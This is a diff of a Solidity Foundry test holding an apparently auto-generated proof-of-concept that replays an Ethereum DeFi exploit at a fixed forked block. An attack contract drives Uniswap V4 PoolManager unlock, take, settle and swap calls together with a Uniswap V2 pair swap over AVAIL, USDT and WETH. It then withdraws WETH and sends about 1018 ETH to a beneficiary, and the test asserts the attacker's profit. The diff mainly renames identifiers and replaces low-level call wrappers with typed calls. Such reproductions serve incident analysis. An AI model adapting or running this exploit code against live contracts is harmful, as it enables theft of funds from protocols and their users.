@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.20;
 
+import {Test, console2} from "forge-std/Test.sol";
 import "./Base.sol";
 
 // @KeyInfo - Total Lost : N/A
@@ -21,8 +22,8 @@ import "./Base.sol";
 // Generated PoC
 
 contract AttackTest is Base {
-    address constant ATTACKER_EOA = Addresses.ATTACKER;
-    address constant ATTACK_CONTRACT = Addresses.ATTACKER;
+    address constant ATTACKER_EOA = Addresses.attack_path_entry;
+    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
     uint256 constant FORK_BLOCK = 25467372;
     uint256 constant TX_TIMESTAMP = 1783267151;
     uint256 constant TX_BLOCK_NUMBER = 25467373;
@@ -208,107 +209,75 @@ contract AttackTest is Base {
     function _expectProfitLegs(address attack, address attackChild) internal override {
         attack;
         attackChild;
-        _expectProfit(Addresses.ATTACKER, ATTACKER_EOA, Addresses.ZERO, "ETH", 53817904194517777076);
-        _expectProfit(Addresses.ATTACKER, attack, Addresses.WETH, "WETH", 1);
+        _expectProfit(Addresses.attack_path_entry, ATTACKER_EOA, Addresses.ZERO, "ETH", 53817904194517777076);
+        _expectProfit(Addresses.attack_path_entry, attack, Addresses.WETH, "WETH", 1);
         _expectProfit(Addresses.A_4838B1_5F97, address(0), Addresses.ZERO, "ETH", 1018251889772367587301);
     }
 }
 
 contract OurAttack {
-    bytes32 private constant UNISWAP_V3_CALLBACK = keccak256("poc.callback.uniswapV3SwapCallback");
-
-    mapping(bytes32 => bool) private _callbackDone;
-    mapping(bytes4 => uint256) private _dispatchCursor;
-
     function attack() public payable {
-        _readPoolState();
-    }
-
-    function _sendAvailToV3() internal {
-        IERC20Like(Addresses.AVAIL).transfer(Addresses.A_80F814_DDB2, 2154172018403229647873);
-    }
-
-    function _sendWethToV2() internal {
-        IERC20Like(Addresses.WETH).transfer(Addresses.UNI_V2, 394222242740549679);
-    }
-
-    function _readPoolUsdtBalance() internal view {
-        IERC20Like(Addresses.USDT).balanceOf(address(this));
-    }
-
-    function _readPoolWethBalance() internal view {
-        IERC20Like(Addresses.WETH).balanceOf(address(this));
-    }
-
-    function _enterUnlockCallback() internal {
-        _decodedCall(Addresses.ATTACKER, abi.encodeWithSignature("unlockCallback(bytes)", hex""));
-    }
-
-    function _readPoolState() internal {
+        IPoolManager poolManager = IPoolManager(Addresses.PoolManager);
         IUNI_V2(Addresses.UNI_V2).getReserves();
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "extsload(bytes32)", bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c458")
-            )
-        );
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "extsload(bytes32)", bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c45b")
-            )
-        );
+        poolManager.extsload(bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c458"));
+        poolManager.extsload(bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c45b"));
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2).slot0();
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2).liquidity();
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "extsload(bytes32)", bytes32(hex"c6f350df2ad5ce5ee5f86d234216d12580e7a518a990d42dfadbbe3349b43c86")
-            )
-        );
+        poolManager.extsload(bytes32(hex"c6f350df2ad5ce5ee5f86d234216d12580e7a518a990d42dfadbbe3349b43c86"));
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(-2));
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(-1));
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(0));
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(1));
-        _decodedCall(Addresses.PoolManager, abi.encodeWithSignature("unlock(bytes)", hex""));
+        poolManager.unlock(hex"");
         uint256 withdrawAmount = 1072069817672276512865;
         IWETH(Addresses.WETH).withdraw(withdrawAmount);
-        (bool paidBeneficiary,) = payable(Addresses.A_4838B1_5F97).call{value: 1018251889772367587301}("");
-        require(paidBeneficiary, "beneficiary payment failed");
+        (bool sent,) = payable(Addresses.A_4838B1_5F97).call{value: 1018251889772367587301}("");
+        require(sent, "profit transfer failed");
+    }
+
+    function _transferAvail() internal {
+        IERC20Like(Addresses.AVAIL).transfer(Addresses.A_80F814_DDB2, 2154172018403229647873);
+    }
+
+    function _transferWeth() internal {
+        IERC20Like(Addresses.WETH).transfer(Addresses.UNI_V2, 394222242740549679);
+    }
+
+    function _settleUsdt() internal view {
+        IERC20Like(Addresses.USDT).balanceOf(address(this));
+    }
+
+    function _settleWeth() internal view {
+        IERC20Like(Addresses.WETH).balanceOf(address(this));
+    }
+
+    function _syncWeth() internal view {
+        IERC20Like(Addresses.WETH).balanceOf(address(this));
+    }
+
+    function _syncUsdt() internal view {
+        IERC20Like(Addresses.USDT).balanceOf(address(this));
     }
 
     function _unlockCallback() internal {
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "take(address,address,uint256)", Addresses.WETH, Addresses.UNI_V2, 394222242740549679
-            )
-        );
+        IPoolManager poolManager = IPoolManager(Addresses.PoolManager);
+        poolManager.take(Addresses.WETH, Addresses.UNI_V2, 394222242740549679);
         IUNI_V2(Addresses.UNI_V2).getReserves();
         IERC20Like(Addresses.WETH).balanceOf(Addresses.UNI_V2);
-        _decodedCall(Addresses.PoolManager, abi.encodeWithSignature("sync(address)", Addresses.USDT));
+        poolManager.sync(Addresses.USDT);
         IUniswapV2PairLike(Addresses.UNI_V2).swap(0, 697268911, Addresses.PoolManager, hex"");
-        _decodedCall(Addresses.PoolManager, abi.encodeWithSelector(bytes4(0x11da60b4)));
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "exttload(bytes32)", bytes32(hex"61ac5916fc3db3aaeeba1f9391995dd4c05363adf447cc28b2e334e6f21f8e99")
-            )
-        );
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "swap((address,address,uint24,int24,address),(bool,int256,uint160),bytes)",
-                Abi_swap_Param0({
-                    field0: Addresses.USDT,
-                    field1: Addresses.AVAIL,
-                    field2: 880000,
-                    field3: 17600,
-                    field4: Addresses.ZERO
-                }),
-                Abi_swap_Param1({field0: true, field1: -697268911, field2: 4295128740}),
-                hex""
-            )
+        poolManager.settle();
+        poolManager.exttload(bytes32(hex"61ac5916fc3db3aaeeba1f9391995dd4c05363adf447cc28b2e334e6f21f8e99"));
+        poolManager.swap(
+            PoolSwapKey({
+                currency0: Addresses.USDT,
+                currency1: Addresses.AVAIL,
+                fee: 880000,
+                tickSpacing: 17600,
+                hooks: Addresses.ZERO
+            }),
+            PoolSwapParams({zeroForOne: true, amountSpecified: -697268911, sqrtPriceLimitX96: 4295128740}),
+            hex""
         );
         IContract_80F814_DDB2(Addresses.A_80F814_DDB2)
             .swap(
@@ -318,138 +287,110 @@ contract OurAttack {
                 uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                 hex""
             );
-        _decodedCall(Addresses.PoolManager, abi.encodeWithSignature("sync(address)", Addresses.WETH));
+        poolManager.sync(Addresses.WETH);
         uint256 wethTransferAmount = 394222242740549679;
         IERC20Like(Addresses.WETH).transfer(Addresses.PoolManager, wethTransferAmount);
-        _decodedCall(Addresses.PoolManager, abi.encodeWithSelector(bytes4(0x11da60b4)));
+        poolManager.settle();
     }
 
-    function _uniswapV3Callback() internal {
-        _callbackDone[UNISWAP_V3_CALLBACK] = true;
-        _decodedCall(
-            Addresses.PoolManager,
-            abi.encodeWithSignature(
-                "take(address,address,uint256)", Addresses.AVAIL, Addresses.A_80F814_DDB2, 2154172018403229647873
-            )
-        );
+    function _v3SwapCallback() internal {
+        _callbackDone[V3_SWAP_CALLBACK] = true;
+        IPoolManager(Addresses.PoolManager).take(Addresses.AVAIL, Addresses.A_80F814_DDB2, 2154172018403229647873);
     }
 
     receive() external payable {}
 
-    function take(address arg0, address arg1, uint256 amount) external payable {
-        arg0;
-        arg1;
+    function take(address token, address recipient, uint256 amount) external payable {
+        token;
+        recipient;
         amount;
-        uint256 dispatchArg0Call2;
-        assembly { dispatchArg0Call2 := calldataload(4) }
-        if (address(uint160(dispatchArg0Call2)) == 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) {
-            _sendWethToV2();
+        uint256 tokenWord;
+        assembly { tokenWord := calldataload(4) }
+        if (address(uint160(tokenWord)) == Addresses.WETH) {
+            _transferWeth();
             return;
         }
-        uint256 dispatchArg0Call;
-        assembly { dispatchArg0Call := calldataload(4) }
-        if (address(uint160(dispatchArg0Call)) == 0xEeB4d8400AEefafC1B2953e0094134A887C76Bd8) {
-            _sendAvailToV3();
+        if (address(uint160(tokenWord)) == Addresses.AVAIL) {
+            _transferAvail();
             return;
         }
-        _sendWethToV2();
+        _transferWeth();
         return;
     }
 
     function settle() external payable {
         uint256 dispatchOrdinal = _nextDispatch(0x11da60b4);
         if (dispatchOrdinal == 0) {
-            _readPoolUsdtBalance();
-            bytes memory usdtSettleReturn = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
-            assembly { return(add(usdtSettleReturn, 32), mload(usdtSettleReturn)) }
+            _settleUsdt();
+            _returnPoolDelta();
         }
         if (dispatchOrdinal == 1) {
-            _readPoolWethBalance();
-            bytes memory wethSettleReturn = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
-            assembly { return(add(wethSettleReturn, 32), mload(wethSettleReturn)) }
+            _settleWeth();
+            _returnPoolDelta();
         }
-        _readPoolUsdtBalance();
-        bytes memory fallbackSettleReturn = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
-        assembly { return(add(fallbackSettleReturn, 32), mload(fallbackSettleReturn)) }
+        _settleUsdt();
+        _returnPoolDelta();
     }
 
-    function extsload(bytes32 arg0) external payable {
-        arg0;
-        uint256 dispatchArg0Call5;
-        assembly { dispatchArg0Call5 := calldataload(4) }
-        if (
-            bytes32(dispatchArg0Call5) == bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c458")
-        ) {
-            bytes memory pairSlotReturn = hex"0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3";
-            assembly { return(add(pairSlotReturn, 32), mload(pairSlotReturn)) }
+    function extsload(bytes32 slot) external payable {
+        uint256 slotWord;
+        assembly { slotWord := calldataload(4) }
+        if (bytes32(slotWord) == bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c458")) {
+            _returnExtSlot(hex"0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3");
         }
-        uint256 dispatchArg0Call7;
-        assembly { dispatchArg0Call7 := calldataload(4) }
-        if (
-            bytes32(dispatchArg0Call7) == bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c45b")
-        ) {
-            bytes memory liquiditySlotReturn = hex"0000000000000000000000000000000000000000000000000001d29884e46b4c";
-            assembly { return(add(liquiditySlotReturn, 32), mload(liquiditySlotReturn)) }
+        if (bytes32(slotWord) == bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c45b")) {
+            _returnExtSlot(hex"0000000000000000000000000000000000000000000000000001d29884e46b4c");
         }
-        uint256 dispatchArg0Call6;
-        assembly { dispatchArg0Call6 := calldataload(4) }
-        if (
-            bytes32(dispatchArg0Call6) == bytes32(hex"c6f350df2ad5ce5ee5f86d234216d12580e7a518a990d42dfadbbe3349b43c86")
-        ) {
-            bytes memory bitmapSlotReturn = hex"0000000000000000000000000000000000000000000000000004000000000000";
-            assembly { return(add(bitmapSlotReturn, 32), mload(bitmapSlotReturn)) }
+        if (bytes32(slotWord) == bytes32(hex"c6f350df2ad5ce5ee5f86d234216d12580e7a518a990d42dfadbbe3349b43c86")) {
+            _returnExtSlot(hex"0000000000000000000000000000000000000000000000000004000000000000");
         }
-        bytes memory defaultSlotReturn = hex"0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3";
-        assembly { return(add(defaultSlotReturn, 32), mload(defaultSlotReturn)) }
+        slot;
+        _returnExtSlot(hex"0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3");
     }
 
-    function unlock(bytes calldata arg0) external payable {
-        arg0;
-        _enterUnlockCallback();
+    function unlock(bytes calldata callbackData) external payable {
+        callbackData;
+        IAttackEntry(Addresses.attack_path_entry).unlockCallback(hex"");
         bytes memory ret = abi.encode(_uintArray0());
         assembly { return(add(ret, 32), mload(ret)) }
     }
 
-    function unlockCallback(bytes calldata arg0) external payable {
-        arg0;
+    function unlockCallback(bytes calldata callbackData) external payable {
+        callbackData;
         _unlockCallback();
         bytes memory ret = abi.encode(_uintArray0());
         assembly { return(add(ret, 32), mload(ret)) }
     }
 
-    function sync(address arg0) external payable {
-        arg0;
-        uint256 dispatchArg0Call10;
-        assembly { dispatchArg0Call10 := calldataload(4) }
-        if (address(uint160(dispatchArg0Call10)) == 0xdAC17F958D2ee523a2206206994597C13D831ec7) {
-            _readPoolUsdtBalance();
+    function sync(address token) external payable {
+        uint256 tokenWord;
+        assembly { tokenWord := calldataload(4) }
+        if (address(uint160(tokenWord)) == Addresses.USDT) {
+            _syncUsdt();
             return;
         }
-        uint256 dispatchArg0Call9;
-        assembly { dispatchArg0Call9 := calldataload(4) }
-        if (address(uint160(dispatchArg0Call9)) == 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) {
-            _readPoolWethBalance();
+        if (address(uint160(tokenWord)) == Addresses.WETH) {
+            _syncWeth();
             return;
         }
-        _readPoolUsdtBalance();
+        token;
+        _syncUsdt();
         return;
     }
 
-    function exttload(bytes32 arg0) external payable {
-        arg0;
+    function exttload(bytes32 slot) external payable {
+        slot;
         bytes memory ret = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
         assembly { return(add(ret, 32), mload(ret)) }
     }
 
-    function swap(Abi_swap_Param0 calldata amount, Abi_swap_Param1 calldata amount1, bytes calldata amount2)
+    function swap(PoolSwapKey calldata poolKey, PoolSwapParams calldata swapParams, bytes calldata hookData)
         external
         payable
     {
-        amount;
-        amount1;
-        amount2;
-        // UNRESOLVED_GAP: PoolManager swap frame has storage-only observations in action_0023..action_0028.
-        // No normal trace-backed call is available in the handoff, so the PoC preserves the observed return only.
+        poolKey;
+        swapParams;
+        hookData;
         bytes memory ret = hex"ffffffffffffffffffffffffd67085510000000000000074c7246571fabd4401";
         assembly { return(add(ret, 32), mload(ret)) }
     }
@@ -458,7 +399,7 @@ contract OurAttack {
         amount0Delta;
         amount1Delta;
         data;
-        if (!_callbackDone[UNISWAP_V3_CALLBACK]) _uniswapV3Callback();
+        if (!_callbackDone[V3_SWAP_CALLBACK]) _v3SwapCallback();
         return;
     }
 
@@ -470,19 +411,43 @@ contract OurAttack {
         }
     }
 
-    function _nextDispatch(bytes4 sigHash) internal returns (uint256 ordinal) {
-        ordinal = _dispatchCursor[sigHash];
-        _dispatchCursor[sigHash] = ordinal + 1;
+    bytes32 private constant V3_SWAP_CALLBACK = keccak256("poc.callback.v3Swap");
+    mapping(bytes32 => bool) private _callbackDone;
+
+    mapping(bytes4 => uint256) private _dispatchCursor;
+    mapping(address => uint256) private _balancerVaultPreBalance;
+
+    function _nextDispatch(bytes4 sig) internal returns (uint256 ordinal) {
+        ordinal = _dispatchCursor[sig];
+        _dispatchCursor[sig] = ordinal + 1;
+    }
+
+    function _recordBalancerPre(address[] memory tokens) internal {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            _balancerVaultPreBalance[tokens[i]] =
+                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+        }
+    }
+
+    function recordBalancerPre(address[] memory tokens) external {
+        _recordBalancerPre(tokens);
+    }
+
+    function balancerVaultPreBalance(address token) external view returns (uint256) {
+        return _balancerVaultPreBalance[token];
     }
 
     function _uintArray0() internal pure returns (uint256[] memory out) {
         out = new uint256[](0);
     }
 
-    function _decodedCall(address target, bytes memory data) internal {
-        (bool ok, bytes memory out) = target.call(data);
-        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
-        require(ok, "attack child dispatch failed");
+    function _returnPoolDelta() internal pure {
+        bytes memory ret = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
+        assembly { return(add(ret, 32), mload(ret)) }
+    }
+
+    function _returnExtSlot(bytes memory ret) internal pure {
+        assembly { return(add(ret, 32), mload(ret)) }
     }
 }
 
@@ -493,7 +458,7 @@ interface VmExt {
 library Addresses {
     address internal constant ZERO = address(0);
     address internal constant PoolManager = 0x000000000004444c5dc75cB358380D2e3dE08A90;
-    address internal constant ATTACKER = 0x00000000fd3A7B3Fa5bCfA843C648714b11E089B;
+    address internal constant attack_path_entry = 0x00000000fd3A7B3Fa5bCfA843C648714b11E089B;
     address internal constant UNI_V2 = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
     address internal constant A_15BFAA_5389 = 0x15BfaA874261055be85fC5DB534f4520A0715389;
     address internal constant A_15F7E7_FFFF = 0x15f7e7B9C1C1ad7efFFFFFfFFFFFFFFFFfffffFF;
@@ -515,18 +480,18 @@ library Addresses {
     address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
 }
 
-struct Abi_swap_Param0 {
-    address field0;
-    address field1;
-    uint24 field2;
-    int24 field3;
-    address field4;
+struct PoolSwapKey {
+    address currency0;
+    address currency1;
+    uint24 fee;
+    int24 tickSpacing;
+    address hooks;
 }
 
-struct Abi_swap_Param1 {
-    bool field0;
-    int256 field1;
-    uint160 field2;
+struct PoolSwapParams {
+    bool zeroForOne;
+    int256 amountSpecified;
+    uint160 sqrtPriceLimitX96;
 }
 
 interface IContract_80F814_DDB2 {
@@ -541,7 +506,7 @@ interface IPoolManager {
     function extsload(bytes32) external view returns (uint256);
     function exttload(bytes32) external view returns (uint256);
     function settle() external returns (uint256);
-    function swap(Abi_swap_Param0 calldata, Abi_swap_Param1 calldata, bytes calldata) external returns (uint256);
+    function swap(PoolSwapKey calldata, PoolSwapParams calldata, bytes calldata) external returns (uint256);
     function sync(address) external;
     function take(address, address, uint256) external;
     function unlock(bytes calldata) external;
@@ -553,4 +518,8 @@ interface IUNI_V2 {
 
 interface IWETH {
     function withdraw(uint256) external;
+}
+
+interface IAttackEntry {
+    function unlockCallback(bytes calldata) external;
 }
